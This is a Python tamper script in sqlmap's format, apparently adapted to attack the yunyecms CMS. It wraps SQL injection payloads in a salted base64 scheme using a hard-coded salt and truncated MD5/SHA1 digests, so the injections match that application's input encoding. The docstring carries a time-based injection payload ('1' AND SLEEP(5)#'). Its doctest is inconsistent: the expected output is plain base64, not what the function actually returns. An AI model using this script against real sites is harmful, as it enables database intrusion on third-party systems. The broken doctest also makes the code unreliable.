#!/usr/bin/env python
"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import base64
import hashlib
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def md5(data):
    hash_md5 = hashlib.md5(data)
    md5data = hash_md5.hexdigest()[8:18]
    return md5data


def sha1(data):
    string_sha1 = hashlib.sha1(data).hexdigest()[0:35]
    return string_sha1


def yunyecms_strencode(string):
    salt = '~^y#u%n$y^e*c%m^s^~'
    return base64.b64encode(md5(salt) + base64.b64encode(string) + sha1(salt))


def tamper(payload, **kwargs):
    """
    Base64-encodes all characters in a given payload

    >>> tamper("1' AND SLEEP(5)#")
    'MScgQU5EIFNMRUVQKDUpIw=='
    """

    return yunyecms_strencode(payload) if payload else payload
